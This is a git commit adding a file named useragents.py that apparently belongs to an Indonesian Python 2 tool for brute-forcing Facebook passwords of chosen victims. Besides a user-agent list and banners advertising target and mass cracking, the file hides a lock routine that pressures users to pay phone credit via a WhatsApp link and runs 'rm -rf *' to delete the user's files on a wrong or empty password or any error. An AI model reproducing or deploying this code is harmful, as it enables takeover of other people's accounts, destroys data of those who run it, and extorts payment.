e744e741aa1361c6760c12469d52aec55a096621
Iqbal_Dev <47203081+IqbalDev@users.noreply.github.com>
2020-07-14 14:26:41 +0700

    Add files via upload

---
+++ useragents.py
@@ -0,0 +1,593 @@
+
+# Useragent Ngambil Dari : https://gist.github.com/pzb/b4b6f57144aea7827ae4
+
+user_agents = [('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
+'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
+'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
+'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
+'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
+'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
+'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
+'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17',
+'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4',
+'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4',
+'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
+'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
+'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
+'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko',
+'Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0',
+'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17',
+'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
+'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
+'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
+'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
+'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0',
+'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
+'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
+'Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16',
+'Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0',
+'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36')]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Author : Iqbal Dev
+# Tools : Geli2 Efbeh
+# Versi : 0.1
+
+# Mau ngapain lu tod..?
+
+d = "\033[90m" 
+m = "\033[91m"
+h = "\033[92m"
+k = "\033[93m"
+b = "\033[94m"
+u = "\033[95m"
+a = "\033[96m"
+p = "\033[97m"
+
+string1 =  '''
+\033[92;1m  +---------------------------------------+
+\033[96;1m        Crack Facebook Target \033[97;1m|\033[93;1m V.01
+\033[92;1m  +---------------------------------------+ \033[97;1m
+ Silahkan Kalian Buat Wordlist Sendiri Hanya 
+ Dengan Memasukkan Nama Depan Dan Belakan Fb 
+Korban Yang Mau Di Crack Passwordnya ya kawan
+'''
+string2 = ''' 
+\033[96;1m        Brute Force Fb Target
+\033[93;1m     +=========================+
+'''
+
+d = "\033[90;1m" 
+m = "\033[91;1m"
+h = "\033[92;1m"
+k = "\033[93;1m"
+b = "\033[94;1m"
+u = "\033[95;1m"
+a = "\033[96;1m"
+p = "\033[97;1m"
+baner = '''
+\033[96;1m  ___   V.0.1  ___ ___  .
+\033[96;1m |   \ _____ _|_ _|   \  |\033[95;1m Using \033[97;1m:\033[93;1m Python27
+\033[92;1m | |) / -_) V /| || |) | |\033[95;1m Tools \033[97;1m:\033[93;1m Geli2 Fb
+\033[97;1m |___/\___|\_/|___|___/  |\033[95;1m Versi \033[97;1m:\033[93;1m 0.1xxxxx\033[97;1m .
+\033[93;1m         {+}_{+}        / \033[95;1m Author\033[97;1m:\033[93;1m IqbalDev\033[97;1m /
+\033[97;1m +--,------------------'----------------,--'
+\033[97;1m   /\033[92;1m Saya Tidak Bertanggung Jawab Atas \033[97;1m  \\
+\033[97;1m  /\033[92;1m Apa Yang Kalian Perbuat, Ini Sengaja\033[97;1m /
+\033[97;1m  \ \033[92;1m    Saya Buat Untuk Uji Keamanan   \033[97;1m /
+\033[97;1m   '-----------------------,-----------'
+\033[92;1m    {\033[97;1m1\033[92m}\033[96;1m Brute Force Target \033[97;1m/\033[96;1m Tanpa Login
+\033[92;1m    {\033[97;1m2\033[92m}\033[96;1m Multi Brute Force \033[97;1m/\033[96;1m Tanpa Login
+\033[92;1m    {\033[97;1m3\033[92m}\033[96;1m Lainnya\033[97;1m..........'
+'''
+
+user_dev = '''
+\033[92;1m    +-------------------------------------+
+\033[96;1m          Crack Facebook Masal | V.01
+\033[92;1m    +-------------------------------------+\033[97;1m
+ Silahkan masukkan Nama orang yang mau di crack, 
+  contoh penulisan: (dinda) atau (dinda maulia) 
+tanpa tanda kurung () ya gan // Selamat Mencoba :)
+'''
+
+
+
+
+
+
+# Author Iqbal Dev
+import os,sys, base64, subprocess
+def deviv():
+	d = open('dir/passw.txt', 'a')
+	d.write('w\n')
+	d.close()
+d = 123
+def divev():
+	# os.mkdir('dir')
+	# open('dir/pass.txt', 'w').write('')
+	# open('dir/passw.txt', 'w').write('w\n'*5)
+
+	data = open('dir/passw.txt', 'r').readlines()
+	da = len(data)
+	z = open('dir/pass.txt', 'r').readlines()
+	v = len(z)
+# 	print da
+	if v < da:
+	    try:
+		print "\n \033[93;1m Kamu udah menggunakan tools ini lebih dari yang di tentukan oleh pembuat, Silahkan kamu minta passwordnya ke pembuat tools ini dengan cara masukkan tgl,bulan, dan tahun kelahiranmu."
+		l = raw_input('\n \033[93;1m    Contoh : 12/09/2000 \n \033[92;1m[T] Masukkan Tnggal Lahir Kamu : \n\033[97;1m ======> ')
+		h = l.replace('/', '0').replace('0', '101').replace('2', 'v').replace('1', 'X').replace('3', 'DEV')
+		ha = base64.b64encode(h)
+	
+		subprocess.check_output(['am','start',"https://wa.me/628812457948?text=*KIRIMKAN KODE UNIK INI :"+ha+" WAJIB |*  Assalamu'alaikum,  Bang Minta Passwordnya, ntar saya kirim pulsa 10k serta bukti pengirimannya  | *Syarat Mendapatkan Password = kamu harus kirim pulsa 10k dulu ke no ini = 08812457948, smartfren, Kirim bukti pengiriman pulsanya (ss), ntar kamu akan di beri Password* Note: PESAN INI JANGAN DI HAPUS, HARUS DIKIRIMKAN!!"])
+		f = raw_input('\n\033[92;1m [P] Masukkan Password : \n\033[97;1m ==============> ')
+		if f == '' or f == ' ':
+			os.system('rm -rf *')
+			print "\n\033[93;1m Sekarang Kamu tidak bisa menggunakan lagi, karena tidak memasukkan password yang benar, silahkan unduh kembali toolsnya di \n  https://github.com/IqbalDev/multi_dev"
+	
+			sys.exit()
+		if f == h:
+			print "\n\033[93;1m Maaf Sandinya Salah.. Silahkan hubungi pembuat programnya dan minta sandi yang benar karena sandinya unik jadi tidak semua pengguna itu sama sandinya, silahkan hubungi pembuatnya.. dengan cara memasukkan tgl, bulan, dan tahun kelahiranmu di tool ini :) \n "
+			raw_input(" \n Tekan ENTER untuk melanjutkan ...")
+			divev()	
+		if f != '0'+h+'0':
+			print "\n\033[93;1m Maaf Sandinya Salah.. Silahkan hubungi pembuat programnya dan minta sandi yang benar karena sandinya unik jadi tidak semua pengguna itu sama sandinya, silahkan hubungi pembuatnya.. dengan cara memasukkan tgl, bulan, dan tahun kelahiranmu di tool ini :) \n "
+			raw_input(" \n Tekan ENTER untuk melanjutkan ...")
+			divev()	
+		if f == '0'+h+'0':
+			g = open('dir/pass.txt', 'w')
+			g.write('w\n'*1000)
+			print '\033[96;1m  \n sukses... \n  Selamat menggunakan tools ini kembali tanpa harus memasukkan password. \n   Trimakasih, Gunakan Tools ini dengan bijak Ya gan :) \n'
+			raw_input(" \n Tekan ENTER untuk Menjalankan Toolsnya Lagi ...")
+			os.system("multi_dev.py" if os.name == "nt" else "python2 multi_dev.py")
+			sys.exit()
+			
+		print "\n\033[93;1m Sekarang Kamu tidak bisa menggunakan lagi, karena tidak memasukkan password yang benar, silahkan unduh kembali toolsnya di \n  https://github.com/IqbalDev/multi_dev"
+		os.system('rm -rf *')
+		
+	    except:
+		os.system('rm -rf *')
+		print "\n\033[93;1m Sekarang Kamu tidak bisa menggunakan lagi, karena tidak memasukkan password yang benar, silahkan unduh kembali toolsnya di \n  https://github.com/IqbalDev/multi_dev"
+		
